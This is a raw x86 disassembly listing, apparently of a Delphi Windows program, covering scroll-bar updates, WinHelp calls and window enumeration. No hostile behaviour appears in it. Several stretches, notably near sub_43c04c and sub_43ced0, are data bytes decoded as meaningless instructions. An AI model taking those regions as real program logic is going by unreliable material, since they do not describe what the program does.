mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_43bc94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43bdcb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_449088
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdd2
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_449088
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403540
mov eax ebx
call sub_43bc38
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollPos
jmp r-xdata
sub_43bdf0
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_449088
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call SetScrollInfo
sub_43beb8
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_43bedd ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448d84
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_43bc38
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403540
mov edx [ esp ]
mov eax ebx
call sub_43bddc
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_43bfe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448d84
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_43c010
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c035
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c03c
retn
sub_43c04c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
rol [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
rol [ ebx ] 0xa0
add [ eax ] al
add [ ebx - 0x5adfffbc ] ah
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
int3
sub_43c13c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ec78
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c178
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c19d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c1a4
retn
sub_43c35c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c411
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404094
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40412c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c418
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404414
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43c42c
push ebx
mov ebx eax
mov eax ebx
call sub_43c75c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4057e0
sub_43c468
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c4cf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43c35c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c4d6
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_43c4e0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c568
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43c454
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404414
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c56f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_43c57b
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43c603
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43cca0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c60a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43c35c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c588
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43c603
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43cca0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c60a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43c35c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c610
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c708
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_43c35c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409094
mov eax ebx
call sub_43cca0
test al al
je r-xdata
mov ecx sub_43c1b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c70f
lea eax [ ebp - 0x1c ]
call sub_404094
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_43c35c
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43cbf8
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404554
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c778
push ebx
mov ebx eax
mov eax ebx
call sub_43c75c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4057e0
pop ebx
retn
mov eax rw-data
call sub_4057e0
sub_43c7a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c800
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c807
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43c35c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43c810
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c906
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_409054
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43c35c
mov eax ebx
call sub_43cca0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c90d
lea eax [ ebp - 0x110 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404304
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43cbf8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404304
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c924
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c986
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c98d
lea eax [ ebp - 0x8 ]
call sub_404094
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c35c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43c998
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ca18
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_43c35c
mov eax ebx
call sub_43cca0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ca1f
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43cbf8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43ca28
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43cb13
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43cca0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb1a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4040b8
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408200
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43cbf8
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408200
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_4040e8
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43c35c
mov eax [ ebp - 0x14 ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43cb28
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408ab8
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43cb83
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a94
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43cbf8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_43cc6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_43cbdc
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc75
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f28
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_43cc84
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43cca0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_43cbdc
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43cc80
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43cc84
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43ccfc
sub_43ccfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43cd79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43c75c
call GetTickCount
mov ebx eax
push 0x0
call sub_40632c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43c35c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cd80
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43cd88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403668
call sub_4057f8
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43cdd0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43cdfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ce6a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce71
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4057e0
mov eax rw-data
call sub_4057e0
mov eax rw-data
call sub_4057e0
mov eax rw-data
call sub_404094
mov eax rw-data
call sub_4057e0
mov eax [ rw-data ]
call sub_43c42c
sub_43ce74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43cec6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cecd
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cd88
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4057e0
mov edx eax
mov eax [ rw-data ]
call sub_425b18
sub_43ced0
aam 0xce
inc ebx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
insb
je r-xdata
fdiv st2
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ ebx + edi * 8 ] ch
inc ebx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add al cl
sti
inc ebx
add [ eax - 0x4bffbc06 ] bh
cli
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
cli
inc ebx
add ah dl
cli
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x31 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 4 - 0x31 ] si
inc ebx
add [ ecx + edx ] bl
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
inc eax
add [ edi + ecx * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror bh 0x1
inc ebx
add [ eax + eax ] dh
add [ eax ] al
enter 0x4010 0x0
add [ eax - 0x2f ] al
inc ebx
add [ eax ] al
add [ eax ] al
add al 0xd0
inc esp
jb r-xdata
add ah bl
cli
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ esp + edi * 8 ] dl
inc ebx
add [ eax + 0x700043f9 ] bh
sti
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add [ eax ] ah
cld
inc ebx
add ah dl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ ebx + edi * 8 ] ch
add [ eax ] al
inc eax
rol [ ebx ] 0x1
inc eax
add [ eax ] al
add [ eax + edx * 8 ] al
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x43d050c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 8 + 0x43 ] bh
add [ eax + eax ] bh
add [ eax ] al
pushad
iretd
inc ebx
add [ eax - 0x2 ] al
inc ebx
add [ edx + edi * 8 - 0x647ffbd ] dh
inc ebx
add al bh
inc ebx
outsd
outsb
je r-xdata
cli
inc ebx
add [ eax - 0x4 ] al
inc ebx
add [ ebx + edi * 8 - 0x4b3ffbd ] bl
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x60 ] si
rol [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ebx
add [ eax - 0x6bffbfcb ] ah
sti
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x68 ] si
rol [ ebx ] 0x1
pop es
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add [ ebp + esi - 0x4c3ffc0 ] cl
inc ebx
add [ esi + edi * 8 + 0x43 ] dl
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
enter 0x43fc 0x0
enter 0x43fb 0x0
inc eax
inc [ ebx ]
mov ah 0xfa
inc ebx
add [ eax - 0x7ffbc07 ] bh
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
cli
inc ebx
add ah dl
cli
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 - 0x2e ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + esi - 0x2e ] si
inc ebx
add [ eax + edx * 8 + 0x43 ] dl
or [ ebx + 0x6f ] al
outsb
je r-xdata
cli
inc ebx
add ah dl
cli
inc ebx
add ah bl
cli
inc ebx
add [ ebp + edi * 8 + 0x43 ] dl
add [ esp + edi * 8 + 0x43 ] ah
add [ ebp + edi * 8 - 0x1e7ffbd ] bl
inc ebx
add [ esi + edi * 8 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ edi ] cl
push esp
inc esp
jb r-xdata
cld
inc ebx
add [ ecx + edi * 8 + 0x43 ] bh
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
xor dl dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x43 ] ch
add [ eax ] dh
add [ eax ] al
